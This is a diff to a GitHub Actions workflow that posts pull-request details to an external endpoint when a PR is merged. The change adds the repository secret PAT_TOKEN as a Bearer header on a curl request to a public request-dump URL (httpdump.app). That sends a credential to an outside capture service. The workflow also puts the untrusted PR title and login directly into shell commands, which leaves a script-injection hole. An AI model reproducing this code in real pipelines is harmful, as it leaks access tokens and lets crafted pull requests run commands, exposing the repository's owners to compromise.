@@ -10,16 +10,22 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout code
-        uses: actions/checkout@v2
+        uses: actions/checkout@v3
 
       - name: Extract PR Information
         id: pr_info
-        run: echo "::set-output name=data::'{\"title\": \"${{ github.event.pull_request.title }}\", \"number\": ${{ github.event.pull_request.number }}, \"user\": \"${{ github.event.pull_request.user.login }}\"}'"
+        run: |
+          echo "::set-output name=data:: |
+            {
+              \"title\": \"${{ github.event.pull_request.title }}\",
+              \"number\": ${{ github.event.pull_request.number }},
+              \"user\": \"${{ github.event.pull_request.user.login }}\"
+            }"
 
       - name: Make API Request
         run: |
           if [ "${{ github.event_name }}" == "pull_request" ] && [ "${{ github.event.pull_request.merged }}" == "true" ]; then
-            curl -X POST -H "Content-Type: application/json" -d "${{ steps.pr_info.outputs.data }}" https://httpdump.app/dumps/3220de01-ed9d-488e-a34f-9893a07fed60
+            curl -X POST -H "Authorization: Bearer ${{ secrets.PAT_TOKEN }}" -H "Content-Type: application/json" -d "${{ steps.pr_info.outputs.data }}" https://httpdump.app/dumps/3220de01-ed9d-488e-a34f-9893a07fed60
           fi
         env:
           PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
